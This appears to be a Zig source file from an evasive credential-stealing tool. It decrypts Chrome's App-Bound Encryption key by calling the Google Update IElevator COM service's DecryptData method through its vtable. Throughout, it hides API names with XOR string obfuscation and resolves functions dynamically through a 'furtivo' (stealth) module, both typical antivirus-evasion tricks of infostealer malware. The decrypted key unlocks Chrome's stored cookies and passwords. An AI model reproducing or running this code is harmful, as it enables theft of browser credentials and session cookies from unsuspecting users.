const std = @import("std");
const furtivo = @import("furtivo.zig");
const obf = @import("obf.zig");

// COM GUID structure
const GUID = extern struct {
    Data1: u32,
    Data2: u16,
    Data3: u16,
    Data4: [8]u8,
};

// CLSID {708860E0-F641-4611-AB26-7F204C1EA1AB} - Google Update Elevation Service
const CLSID_IElevator = GUID{
    .Data1 = 0x708860E0,
    .Data2 = 0xF641,
    .Data3 = 0x4611,
    .Data4 = .{ 0xAB, 0x26, 0x7F, 0x20, 0x4C, 0x1E, 0xA1, 0xAB },
};

// IID {A9BD4F8C-2E8F-4D41-B7C6-5BDD3C3DB7D8} - IElevator interface
const IID_IElevator = GUID{
    .Data1 = 0xA9BD4F8C,
    .Data2 = 0x2E8F,
    .Data3 = 0x4D41,
    .Data4 = .{ 0xB7, 0xC6, 0x5B, 0xDD, 0x3C, 0x3D, 0xB7, 0xD8 },
};

const CLSCTX_LOCAL_SERVER: u32 = 0x4;
const COINIT_MULTITHREADED: u32 = 0x2;

// Function pointer types for dynamically-resolved COM functions
const CoInitializeExFn = *const fn (?*anyopaque, u32) callconv(.winapi) i32;
const CoCreateInstanceFn = *const fn (*const GUID, ?*anyopaque, u32, *const GUID, *?*anyopaque) callconv(.winapi) i32;

// DecryptData is vtable method 3 (0-indexed: QueryInterface=0, AddRef=1, Release=2, DecryptData=3)
// On x64, each vtable entry is 8 bytes
const DecryptDataVtableOffset: usize = 3 * @sizeOf(usize);

// DecryptData signature: fn(this, encrypted_ptr, encrypted_len, decrypted_ptr_ptr, decrypted_len_ptr) callconv(.winapi) i32
// Actually the real IElevator::DecryptData takes:
// (this, DWORD version, const BYTE* encrypted, DWORD encrypted_len, BYTE** decrypted, DWORD* decrypted_len, ...)
// We simplify to the essential parameters.
const DecryptDataFn = *const fn (
    ?*anyopaque, // this
    u32, // version (always 1 for Chrome ABE)
    [*]const u8, // encrypted data
    u32, // encrypted data len
    *[*]u8, // decrypted data ptr (allocated by COM)
    *u32, // decrypted data len
    ?*anyopaque, // unknown (null)
) callconv(.winapi) i32;

// Check if key starts with "APPB"
pub fn isAppBoundKey(key: []const u8) bool {
    if (key.len < 4) return false;
    return key[0] == 'A' and key[1] == 'P' and key[2] == 'P' and key[3] == 'B';
}

pub fn decryptAppBoundKey(allocator: std.mem.Allocator, encrypted_key: []const u8) ![]u8 {
    // The key format after base64 decode:
    // "APPB" (4 bytes) + provider_guid (16 bytes) + encrypted_key_blob
    // The encrypted_key_blob is what we pass to IElevator::DecryptData
    if (encrypted_key.len < 4 + 16 + 1) return error.InvalidAppBoundKey;
    if (!isAppBoundKey(encrypted_key)) return error.NotAppBoundKey;

    // Skip "APPB" prefix (4 bytes) and provider GUID (16 bytes)
    const encrypted_blob = encrypted_key[4 + 16 ..];

    // Resolve ole32.dll
    const ole32_name = obf.xorStr("ole32.dll");
    const ole32 = furtivo.getModuleHandle(&ole32_name);
    if (ole32 == 0) return error.Ole32NotFound;

    // Resolve CoInitializeEx
    const coinit_name = obf.xorStr("CoInitializeEx");
    const coinit_addr = obf.getProcAddress(ole32, &coinit_name) catch 0;
    if (coinit_addr == 0) return error.CoInitializeExNotFound;
    const CoInitializeEx = @as(CoInitializeExFn, @ptrFromInt(coinit_addr));

    // Resolve CoCreateInstance
    const cocreate_name = obf.xorStr("CoCreateInstance");
    const cocreate_addr = obf.getProcAddress(ole32, &cocreate_name) catch 0;
    if (cocreate_addr == 0) return error.CoCreateInstanceNotFound;
    const CoCreateInstance = @as(CoCreateInstanceFn, @ptrFromInt(cocreate_addr));

    // Initialize COM
    _ = CoInitializeEx(null, COINIT_MULTITHREADED);

    // Create IElevator instance
    var elevator: ?*anyopaque = null;
    const hr = CoCreateInstance(&CLSID_IElevator, null, CLSCTX_LOCAL_SERVER, &IID_IElevator, &elevator);
    if (hr != 0) return error.CoCreateInstanceFailed;
    if (elevator == null) return error.ElevatorNull;
    defer {
        // Release the COM object: vtable[2] = Release
        const vtable_ptr_val = @as(*usize, @ptrCast(@alignCast(elevator.?))).*;
        const ReleaseFn = @as(*const fn (?*anyopaque) callconv(.winapi) u32, @ptrFromInt(@as(*usize, @ptrFromInt(vtable_ptr_val + 2 * @sizeOf(usize))).*));
        _ = ReleaseFn(elevator);
    }

    // Read the vtable pointer from the object
    const vtable_ptr_val = @as(*usize, @ptrCast(@alignCast(elevator.?))).*;

    // Get DecryptData function pointer from vtable offset 3
    const decrypt_data_ptr = @as(*usize, @ptrFromInt(vtable_ptr_val + DecryptDataVtableOffset)).*;
    if (decrypt_data_ptr == 0) return error.DecryptDataNotFound;
    const DecryptData = @as(DecryptDataFn, @ptrFromInt(decrypt_data_ptr));

    // Call DecryptData
    var decrypted_ptr: [*]u8 = undefined;
    var decrypted_len: u32 = 0;

    const decrypt_hr = DecryptData(
        elevator, // this
        1, // version
        encrypted_blob.ptr, // encrypted data
        @intCast(encrypted_blob.len), // encrypted data len
        &decrypted_ptr, // decrypted data output
        &decrypted_len, // decrypted len output
        null, // unknown param
    );

    if (decrypt_hr != 0) return error.DecryptDataFailed;
    if (decrypted_len == 0) return error.DecryptDataEmpty;

    // Copy the decrypted key
    const decrypted_key = try allocator.alloc(u8, decrypted_len);
    @memcpy(decrypted_key, decrypted_ptr[0..decrypted_len]);

    // Free the COM-allocated buffer using CoTaskMemFree
    const cotask_free_name = obf.xorStr("CoTaskMemFree");
    const cotask_free_addr = obf.getProcAddress(ole32, &cotask_free_name) catch 0;
    if (cotask_free_addr != 0) {
        const CoTaskMemFree = @as(*const fn (?*anyopaque) callconv(.winapi) void, @ptrFromInt(cotask_free_addr));
        CoTaskMemFree(@ptrCast(decrypted_ptr));
    }

    return decrypted_key;
}
